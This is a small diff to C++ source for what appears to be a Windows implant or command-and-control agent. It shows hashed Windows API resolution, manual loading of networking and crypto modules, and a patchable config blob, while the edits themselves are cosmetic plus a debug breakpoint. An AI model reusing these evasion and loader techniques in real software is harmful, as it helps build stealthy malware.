@@ -10,8 +10,7 @@ using namespace Memory::Context;
 
 // TODO: consider hash-tables for API struct
 namespace Main {
-    UINT8
-        __attribute__((used, section(".data"))) Config[CONFIG_SIZE] = { 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa, };
+    UINT8 __attribute__((used, section(".data"))) Config[CONFIG_SIZE] = { 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa, };
 
     VOID MainRoutine() {
         HEXANE;
@@ -257,7 +256,7 @@ namespace Main {
 		x_assertb(F_PTR_HMOD(ctx->win32.FreeResource, 							ctx->modules.kernel32, FREERESOURCE));
 		x_assertb(F_PTR_HMOD(ctx->win32.SetProcessValidCallTargets, 			ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS));
 
-		// TODO: Memory leak for heap-allocated EXECUTABLE*. Only need DllBase
+		// TODO: Memory leak for heap-allocated EXECUTABLE*. Only need DllBase and free the module entry.
 		x_assertb(ctx->modules.shlwapi	= (HMODULE) ImportModule(LoadLocalFile, SHLWAPI, nullptr, 0, nullptr)->base);
         x_assertb(ctx->modules.crypt32  = (HMODULE) ImportModule(LoadLocalFile, CRYPT32, nullptr, 0, nullptr)->base);
         x_assertb(ctx->modules.winhttp  = (HMODULE) ImportModule(LoadLocalFile, WINHTTP, nullptr, 0, nullptr)->base);
@@ -377,6 +376,7 @@ namespace Main {
 using namespace Main;
 VOID Entrypoint() {
 
+	__debugbreak();
     if (!ContextInit() || !ResolveApi() || !ReadConfig()) {
         return;
     }
